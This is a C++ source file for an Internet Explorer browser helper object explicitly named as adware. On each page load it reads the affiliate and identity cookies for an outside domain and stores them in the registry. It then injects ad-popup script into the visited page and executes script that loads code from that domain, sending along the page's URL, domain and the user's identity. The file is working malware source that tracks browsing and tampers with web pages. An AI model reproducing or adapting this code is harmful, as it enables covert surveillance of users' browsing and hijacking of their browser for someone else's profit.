// AdWareBHO.cpp : Implementation of CAdWareBHO

#include "stdafx.h"
#include "AdWareBHO.h"


// CAdWareBHO


STDMETHODIMP CAdWareBHO::SetSite(IUnknown* pUnkSite)
{
    if (pUnkSite != NULL)
    {
        // Cache the pointer to IWebBrowser2.
        HRESULT hr = pUnkSite->QueryInterface(IID_IWebBrowser2, (void **)&m_spWebBrowser);
        if (SUCCEEDED(hr))
        {
            // Register to sink events from DWebBrowserEvents2.
            hr = DispEventAdvise(m_spWebBrowser);
            if (SUCCEEDED(hr))
            {
                m_fAdvised = TRUE;
            }
        }
    }
    else
    {
        // Unregister event sink.
        if (m_fAdvised)
        {
            DispEventUnadvise(m_spWebBrowser);
            m_fAdvised = FALSE;
        }

        // Release cached pointers and other resources here.
        m_spWebBrowser.Release();
    }

    // Call base class implementation.
    return IObjectWithSiteImpl<CAdWareBHO>::SetSite(pUnkSite);
}

void CAdWareBHO::BlackList(CString Domain)
{
	// HKEY_CURRENT_USER\Software\blacklist
	HKEY phkResult = 0;
	//Check if a key exists
	LONG ret = 0;
	CString Key = CString("Software\\blacklist");
	ret =  RegCreateKeyEx(HKEY_CURRENT_USER, Key,0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,NULL,&phkResult,NULL);
	
	if(ret == ERROR_SUCCESS)
	{
		SYSTEMTIME Time;
		GetLocalTime(&Time);
		CString sTime;
		sTime.Format(L"%d-%d-%d %d",Time.wYear,Time.wMonth,Time.wDay,Time.wHour);
		//MessageBox(0,sTime,L"Time",MB_OK);


		HKEY hkey;
		if(RegSetValueEx(phkResult,Domain,	NULL, REG_SZ, (BYTE *)sTime.GetBuffer(),sTime.GetLength()*2) == ERROR_SUCCESS) {}
			//MessageBox(0,L"RegSetValueEx succeeded",L"succ",MB_OK);
		//else //MessageBox(0,L"RegSetValueEx failed",L"failed",MB_OK);
	}
}

bool CAdWareBHO::CheckTime(CString DateTime)
{
	// false = Not blacklisted i.e. Time Expired
	// true = blacklisted i.e. Time Not Expired

	//Get System date time
	SYSTEMTIME lTime;
	GetLocalTime(&lTime);
	
	//Check the date
	CString Date;
	int Pos = DateTime.Find(L"-",0);
	int Year = _wtoi(DateTime.Mid(0,Pos).GetBuffer());
	int Pos2 = DateTime.Find(L"-",Pos + 1);
	int Month = _wtoi(DateTime.Mid(Pos + 1,Pos2 - Pos - 1).GetBuffer());
	int Pos3 = DateTime.Find(L" ",Pos2 + 1);
	int Day = _wtoi(DateTime.Mid(Pos2 + 1, Pos3 - Pos2 - 1).GetBuffer());

	if(lTime.wYear > Year)
		return false;
	if(lTime.wMonth > Month)
		return false;
	if(lTime.wDay > Day)
		return false;


	int spPos = DateTime.ReverseFind(' ');
	CString Time = DateTime.Mid(spPos + 1,DateTime.GetLength());

	int Hr = _wtoi(Time.GetBuffer());
	
	int CurrentHr = lTime.wHour;
	if( ((Hr + 8) % 24) <= CurrentHr) //Time  expired
		return false;
	 return true;
}

bool CAdWareBHO::IsBlackListed(CString Domain)
{
	//Check if it is blacklisted
	// HKEY_CURRENT_USER\Software\blacklist
	HKEY phkResult = 0;
	//Check if a key exists
	LONG ret = 0;
	CString Key = CString("Software\\blacklist");
	ret = RegOpenKeyEx(HKEY_CURRENT_USER , Key, 0, KEY_ALL_ACCESS, &phkResult);
	//if(ret == ERROR_SUCCESS)
		////MessageBox(0,L"success",L"opened",MB_OK);
	//check if a key named the Domain exists in this key
	LSTATUS status;
	BYTE Value[1000];
	DWORD size = 1000;
	DWORD dwType;
	status = RegQueryValueEx(phkResult,Domain,NULL,&dwType,Value,&size);
	if(status != ERROR_SUCCESS)
	{
		//Key does not exist, so not blacklisted
		BlackList(Domain);
		return false; //Not blacklisted
	}
	else if(status == ERROR_SUCCESS)
	{
		//Check if the time exceeds 8 hrs 
		//Get the time (value of the key)
		CString Time;
		Time.Format(L"%s",Value);
		////MessageBox(0,Time,L"Value",MB_OK);
		if(!CheckTime(Time)) 
		{
			////MessageBox(0,L"Time expired",L"true",MB_OK);
			BlackList(Domain);
			return false; // Not BlackListed
		}
		else{
			////MessageBox(0,L"Time NOT expired",L"true",MB_OK);
			return true; // time under 8 hrs , so blacklisted
		}
	}
	return true;
}

typedef UINT (CALLBACK* lpfn)(LPCWSTR ,LPCWSTR ,LPWSTR ,DWORD*, DWORD);

CString CAdWareBHO::GetAffCookie()
{
	CString sCookie;
	//First check if cookie key exists in the registry
	
	// HKEY_CURRENT_USER\Software\blacklist
	HKEY phkResult = 0;
	//Check if a key exists
	LONG ret = 0;
	CString Key = CString("Software\\blacklist");
	ret = RegCreateKeyEx(HKEY_CURRENT_USER, Key,0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,NULL,&phkResult,NULL);
	//if(ret == ERROR_SUCCESS)
		////MessageBox(0,L"success",L"opened",MB_OK);
	//check if a key named the Domain exists in this key
	LSTATUS status;
	BYTE Value[1000];
	DWORD size = 1000;
	DWORD dwType;
	status = RegQueryValueEx(phkResult,L"AffCookie",NULL,&dwType,Value,&size);
	if(status == ERROR_SUCCESS)
	{
		sCookie.Format(L"%s",Value);
	}
	else
	{
		/* 1 . Get the cookie from IE
		   2.  Put it in the registry.
		   3.  Return the cookie
	   */

		//Check if in protected mode
		BOOL res;
		HRESULT ret = IEIsProtectedModeProcess(&res);
		TCHAR CookieData[1000];
		DWORD dwCookieData = 1000;
		if(ret == S_OK && res) //IE 8 and protected mode
		{	
			HMODULE hMod = LoadLibrary(L"ieframe.dll");
			//if(hMod == NULL)
			//	//MessageBox(0,L"hMod = NULL",L"cookie",MB_OK);
			lpfn IEGetProtectedModeCookie  = (lpfn)GetProcAddress(hMod,"IEGetProtectedModeCookie");
			////MessageBox(0,L"IE 8 and protected mode",L"mod",MB_OK);
			if(IEGetProtectedModeCookie == NULL)
			{
				////MessageBox(0,L"IEGetProtectedModeCookie = NULL",L"cookie",MB_OK);
			}
			//else 	//MessageBox(0,L"IEGetProtectedModeCookie != NULL",L"cookie",MB_OK);
			HRESULT hr = E_FAIL;
			if(IEGetProtectedModeCookie != NULL)
			 hr = IEGetProtectedModeCookie(L"http://h4zy.info/",L"AffiliateID",CookieData,&dwCookieData,NULL);
			if(SUCCEEDED(hr))
			{
			//	//MessageBox(0,L"IEGetProtectedModeCookie success",L"success",MB_OK);
			//	//MessageBox(0,CookieData,L"Cookie Data",MB_OK);
			}
			else
			{
			   DWORD hr = GetLastError();
			   CString srr;
			   srr.Format(L"%d",hr);
			  // //MessageBox(0,srr,L"error code",MB_OK);
			}

		}
		else //either un-protected or not in ie8
		{
			if(InternetGetCookie(L"http://h4zy.info/",L"AffiliateID",CookieData,&dwCookieData)){}
				////MessageBox(0,CookieData,L"Cookie Data",MB_OK);
			else
			{
				DWORD err = GetLastError();
				CString srr;
				srr.Format(L"%d",err);
				////MessageBox(0,srr,L"error code",MB_OK);
				////MessageBox(0,CookieData,L"Cookie Data",MB_OK);
			}
		}

		//write them in the registry

		HKEY hkey;
		sCookie = CookieData;
		RegSetValueEx(phkResult,L"AffCookie",	NULL, REG_SZ, (BYTE *)sCookie.GetBuffer(),sCookie.GetLength()*2);
	}
		int Pos = sCookie.Find(L"=");
		return sCookie.Mid(Pos + 1);
}

CString CAdWareBHO::GetIdentCookie()
{
	CString sCookie;
	//First check if cookie key exists in the registry
	
	// HKEY_CURRENT_USER\Software\blacklist
	HKEY phkResult = 0;
	//Check if a key exists
	LONG ret = 0;
	CString Key = CString("Software\\blacklist");
	ret = RegCreateKeyEx(HKEY_CURRENT_USER, Key,0,NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS,NULL,&phkResult,NULL);
	//if(ret == ERROR_SUCCESS)
		////MessageBox(0,L"success",L"opened",MB_OK);
	//check if a key named the Domain exists in this key
	LSTATUS status;
	BYTE Value[1000];
	DWORD size = 1000;
	DWORD dwType;
	status = RegQueryValueEx(phkResult,L"IdentCookie",NULL,&dwType,Value,&size);
	if(status == ERROR_SUCCESS)
	{
		sCookie.Format(L"%s",Value);
	}
	else
	{
		/* 1 . Get the cookie from IE
		   2.  Put it in the registry.
		   3.  Return the cookie
	   */

		//Check if in protected mode
		BOOL res;
		HRESULT ret = IEIsProtectedModeProcess(&res);
		TCHAR CookieData[1000];
		DWORD dwCookieData = 1000;
		if(ret == S_OK && res) //IE 8 and protected mode
		{	
			HMODULE hMod = LoadLibrary(L"ieframe.dll");
			//if(hMod == NULL)
			//	//MessageBox(0,L"hMod = NULL",L"cookie",MB_OK);
			lpfn IEGetProtectedModeCookie  = (lpfn)GetProcAddress(hMod,"IEGetProtectedModeCookie");
			////MessageBox(0,L"IE 8 and protected mode",L"mod",MB_OK);
			if(IEGetProtectedModeCookie == NULL)
			{
				////MessageBox(0,L"IEGetProtectedModeCookie = NULL",L"cookie",MB_OK);
			}
			//else 	//MessageBox(0,L"IEGetProtectedModeCookie != NULL",L"cookie",MB_OK);
			HRESULT hr = E_FAIL;
			if(IEGetProtectedModeCookie != NULL)
			 hr = IEGetProtectedModeCookie(L"http://h4zy.info/",L"identity",CookieData,&dwCookieData,NULL);
			if(SUCCEEDED(hr))
			{
			//	//MessageBox(0,L"IEGetProtectedModeCookie success",L"success",MB_OK);
			//	//MessageBox(0,CookieData,L"Cookie Data",MB_OK);
			}
			else
			{
			   DWORD hr = GetLastError();
			   CString srr;
			   srr.Format(L"%d",hr);
			  // //MessageBox(0,srr,L"error code",MB_OK);
			}

		}
		else //either un-protected or not in ie8
		{
			if(InternetGetCookie(L"http://h4zy.info/",L"identity",CookieData,&dwCookieData)){}
				////MessageBox(0,CookieData,L"Cookie Data",MB_OK);
			else
			{
				DWORD err = GetLastError();
				CString srr;
				srr.Format(L"%d",err);
				////MessageBox(0,srr,L"error code",MB_OK);
				////MessageBox(0,CookieData,L"Cookie Data",MB_OK);
			}
		}

		//write them in the registry

		HKEY hkey;
		sCookie = CookieData;
		RegSetValueEx(phkResult,L"IdentCookie",	NULL, REG_SZ, (BYTE *)sCookie.GetBuffer(),sCookie.GetLength()*2);
	}
		int Pos = sCookie.Find(L"=");
		return sCookie.Mid(Pos + 1);
}

void STDMETHODCALLTYPE CAdWareBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL)
{
     HRESULT hr = S_OK;

    // Query for the IWebBrowser2 interface.
    CComQIPtr<IWebBrowser2> spTempWebBrowser = pDisp;

    // Is this event associated with the top-level browser?
    if (spTempWebBrowser && m_spWebBrowser &&
        m_spWebBrowser.IsEqualObject(spTempWebBrowser))
    {
		 // Get the current document object from browser...h
        CComPtr<IDispatch> spDispDoc;
        hr = m_spWebBrowser->get_Document(&spDispDoc);
		
        if (SUCCEEDED(hr))
        {
            // ...and query for an HTML document.
            CComQIPtr<IHTMLDocument2> spHTMLDoc = spDispDoc;
            if (spHTMLDoc != NULL)
            {
				//Add the domain name to blacklist
				CComBSTR Domain;
				spHTMLDoc->get_domain(&Domain);
				//MessageBox(0,Domain,L"Domain Name",MB_OK);
				CString AffiliateID = GetAffCookie();
				CString Identity = GetIdentCookie();

				if(IsBlackListed(CString(Domain)))
					return;
				
				//Add the Popup Domain Script
				CString PopupDomainCallbackJS  = 

				CString("<SCRIPT DEFER>") +
				CString("function setOpacity(el){") + 
				CString("el.style.filter=\"alpha(opacity:100)\";") +
				CString("el.style.KHTMLOpacity=\"0.100\";") + 
				CString("el.style.MozOpacity=\"0.100\";") + 
				CString("el.style.opacity=\"0.100\";") +
				CString("}") +

				CString("function CreateEl(t,c){") + 
				CString("var x=document.createElement(t);") +
				CString("x.className=c;") +
				CString("x.style.display=\"block\";") +
				CString("return(x);") + 
				CString("}") + 

					CString("function AddDCss(){") +
					CString("var l=CreateEl(\"link\");") +
					CString("l.setAttribute(\"type\",\"text/css\");") + 
					CString("l.setAttribute(\"rel\",\"stylesheet\");") + 
					CString("l.setAttribute(\"href\",\"http://h4zy.info/stylesheets/btd.css\");") + 
					CString("l.setAttribute(\"media\",\"screen\");") + 
					CString("document.getElementsByTagName(\"head\")[0].appendChild(l);}") +

					CString("function DisplayDom(Description,Url)") +
					CString("{") + 

					CString("AddDCss();") + 
					CString("h=document.createElement(\"span\");") + 
					CString("h.id=\"btc2\";") +
					CString("h.setAttribute(\"id\",\"btc2\");") +
					CString("h.style.position=\"absolute\";") +
					CString("h.style.zIndex=\"100\";") +
					CString("document.getElementsByTagName(\"body\")[0].appendChild(h);") +

					CString("tooltipd=CreateEl(\"span\",\"tooltipd\");")  +
					CString("s=CreateEl(\"span\",\"top\");") +
					CString("s.appendChild(document.createTextNode(Description));") + 
					CString("tooltipd.appendChild(s);") + 
					CString("b=CreateEl(\"b\",\"bottom\");") +
					CString("l=Url;") +
					CString("if(l.length>30) l=l.substr(0,27)+\"...\";") + 
					CString("Link = document.createElement(\"a\");") +
					CString("Link.href = Url;") + 
					CString("Link.appendChild(document.createTextNode(l));") + 
					CString("b.appendChild(Link);") + 
					CString("tooltipd.appendChild(b);") + 
					CString("setOpacity(tooltipd);") + 

					CString("document.getElementById(\"btc2\").appendChild(this.tooltipd);") + 
					CString("document.getElementById(\"btc2\").style.top=(0)+\"px\";") +
					CString("document.getElementById(\"btc2\").style.left=(0)+\"px\";}") +

					//DisplayDomainAds
					  CString("function DisplayDomainAds(DomainPopups)") +
				     CString("{") +
						//"alert('in DisplayDomainAds');" +
						CString("for(var i=0;i<DomainPopups.length;i++)") +
						CString("{") + 
							CString("DisplayDom(DomainPopups[i].Description,DomainPopups[i].Link);") +
						CString("}") + 
					  CString("}") + 

					
					  //Confirmation()
					  CString("function SendConfirmation(url)") +
					  CString("{") + 
					  //CString("var URL = escape(encodeURI(url));") +
                      //CString("var headID = document.getElementsByTagName(\"body\")[0];") +
                      //CString("var newScript = document.createElement('script');") +
                      //CString("newScript.type = 'text/javascript';") +
                      //CString("newScript.src = 'http://h4zy.info/ads/byurl?AdConfirm=1&' + 'AffiliateID=") + AffiliateID + CString("&Identity=") + Identity + CString("' + '&AdPageURL=' + URL + '&PageURL=' + escape(encodeURI(document.URL)) + '&URLDomain=' + document.domain;") +
                      //CString("headID.appendChild(newScript);") +
					  CString("}") +
					
					  //CallBack ()
					CString("var DomainPopups = new Array();") + 

					CString("function Callback(data)") +
					CString("{") +
					CString("for(var i=0;i<data.Response[0].PopupDomain.length;i++)") +
					CString("{") +
							CString("DomainPopups[i] = new Object();") +
							CString("DomainPopups[i].Description = data.Response[0].PopupDomain[i].Description;") +
							CString("DomainPopups[i].Link = data.Response[0].PopupDomain[i].Link;") +
					CString("}") +
					CString("setTimeout('DisplayDomainAds(DomainPopups)',2000);") +
					//Send a JSON Confirmation to the server that the ad got displayed for PPC
					CString("SendConfirmation(DomainPopups[0].Link);") +
					CString("}") + 


					CString("</SCRIPT>");

					// Get the <HEAD> tag and insert the above script
					long len;
					CComPtr<IHTMLElementCollection> Coll;
					spHTMLDoc->get_all(&Coll);
					CComPtr<IDispatch> pDisp;
					Coll->tags(CComVariant("HEAD"),&pDisp);
					CComQIPtr<IHTMLElementCollection> pHeads = pDisp;
					CComPtr<IDispatch> ppDisp;
					pHeads->item(CComVariant(0),CComVariant(),&ppDisp);
					CComQIPtr<IHTMLElement> pHead = ppDisp;

					//Insert the script
					pHead->insertAdjacentHTML(CComBSTR("afterBegin"), CComBSTR(CString("<input type=button onclick=go2() value='Click Me' style=\"display:none;visibility:hidden;\"><BR>") + PopupDomainCallbackJS));


				 // Add JSON to send request to server
				 CString ADJSONGenerator =     CString("var URL = escape(encodeURI(document.URL));") +
                                               CString("var headID = document.getElementsByTagName(\"body\")[0];") +
                                               CString("var newScript = document.createElement('script');") +
                                               CString("newScript.type = 'text/javascript';") +
                                               CString("newScript.src = 'http://h4zy.info/ads/byurl?GetAd=1' + '&AffiliateID=") + AffiliateID + CString("&identity=") + Identity + CString("&URLDomain=' + document.domain + '&' + 'PageURL=' + URL;") +
                                               CString("headID.appendChild(newScript);");

				 CComPtr<IHTMLWindow2> pParent;
				 spHTMLDoc->get_parentWindow(&pParent);
				 VARIANT RetVal;
				 pParent->execScript(CComBSTR(ADJSONGenerator.GetBuffer()), CComBSTR("JavaScript"),&RetVal);
            }
        }
	}
}